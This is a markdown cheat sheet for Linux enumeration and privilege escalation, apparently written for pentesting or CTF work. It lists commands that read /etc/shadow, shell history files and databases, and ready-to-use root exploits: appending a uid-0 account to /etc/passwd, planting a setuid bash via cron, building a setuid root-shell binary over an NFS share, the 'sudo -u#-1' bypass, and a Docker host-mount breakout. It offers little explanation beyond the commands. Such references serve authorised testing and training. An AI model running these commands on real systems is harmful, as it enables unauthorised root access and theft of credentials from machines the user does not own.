# Linux Enumeration and Privilege Escalation
## Enumeration
-> Get system distribution and version
```bash
cat /etc/*-release
```

-> Get kernel version
```bash
cat /proc/version   
uname -a
```

-> View variable environments 
```bash
env
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.zshrc
```

-> View user command history
```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

-> List running processes
```bash
ps aux
```

-> View interfaces and network information 
```bash
ifconfig
ip addr
```

-> View all active TCP connections and the TCP and UDP ports the host is listening on.
```bash
netstat -ant
```

-> Get DNS resolver and hosts mapped to an IP
```bash
cat /etc/resolv.conf
cat /etc/hosts
```

-> Get system user, group and password information
```bash
cat /etc/passwd
cat /etc/shadow
```

### Extracting database information
#### PostgreSQL
-> psql terminal as postgres user
```bash
su postgres
psql
```
-> list the databases
```bash
\list
``` 

-> select the database
```bash
\c <database>
```

-> list the tables
```bash
\d
```

-> dump
```bash
select * from <table>;
```

-> read files
```bash
CREATE TABLE demo(t text);
COPY demo from '<filename>';
SELECT * FROM demo;
```

#### SQLite
-> access database
```bash
sqlite3 <database.db>
```

-> list the tables
```bash
.tables
```

-> dump
```bash
select * from <table>;
```

#### MySQL
```bash
mysql -u root -h localhost -p
```
-> list the databases
```bash
show databases;
```
-> select the database
```bash
use <database>;
```

-> list the tables
```bash
show tables;
```

-> dump
```bash
SELECT * FROM <table>;
```

### Other Tips
-> Perform code review on web server files (/var/www/html);
-> Check log files for credentials;

--- 

## Privilege Escalation
### Crontab [PrivEsc]
-> Enumeration  
```bash
cat /var/log/cron.log                                                                                                                                              
cat /etc/crontab
```

-> Exploitation  
```bash
echo "chmod +s /bin/bash" >> script.sh
```

### SUID [PrivEsc]
-> Enumeration 
```bash
find / -perm -u=s -type f 2>/dev/null
```
or  
```bash
id
find / -perm -u=s -type f -group <group> 2>/dev/null
```

-> Exploitation  
- https://gtfobins.github.io/

### Capabilities [PrivEsc]
-> Enumeration  
```bash
getcap -r / 2>/dev/null
```

-> Exploitation  
- https://gtfobins.github.io/

### Binary with Sudo [PrivEsc]
```bash
sudo -l
```
or  
```bash
cat /etc/sudoers
```

-> Exploitation  
- https://gtfobins.github.io/

#### Run commands as another user with permission through sudo [PrivEsc]
```bash
sudo -u <username> <command>
```

### Weak File Permissions / Passwd Writabble [PrivEsc]
-> Enumeration  
```bash
ls -la /etc/passwd
ls -la /etc/shadow
```

-> Exploitation  
```bash
echo "user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
```

### NFS Root Squashing
-> Detection - VM Owned
```bash
cat /etc/exports
```

-> Viewing nfs directories with access - Attacker VM
```
showmount -e <ip>
```

-> Get nfs version - Attacker VM
```bash
rpcinfo <ip>
```

-> Mount - Attacker VM
```bash
mkdir /tmp/1
mount -o rw,vers=2 <ip>:/<nfs_directory> /tmp/1
```

-> Creating and compiling file for privesc - Attacker VM
```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
```

-> Exploitation - VM Owned
```bash
/tmp/x
id
```

### sudo < v1.28 - @sickrov [PrivEsc]
```bash
sudo -u#-1 /bin/bash
```

### Docker Breakout [PrivEsc]
-> Search the socket
```bash
find / -name docker.sock 2>/dev/null
```

-> list images  
```bash
docker images
```

-> Exploitation
```bash
docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
```

### Linux Enumeration Tools [PrivEsc]
-> Linpeas
```bash
./linpeas.sh
```
- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

-> pspy (unprivileged Linux process snooping)  
```bash
./pspy64
```
- https://github.com/DominicBreuker/pspy

-> linux-exploit-suggester
```bash
./linux-exploit-suggester.sh
```
or  
```bash
./linux-exploit-suiggester.sh --uname <uname-string>
```
- https://github.com/The-Z-Labs/linux-exploit-suggester

-> Unix Privesc Check
```bash
./unix-privesc-check
```
- https://pentestmonkey.net/tools/audit/unix-privesc-check
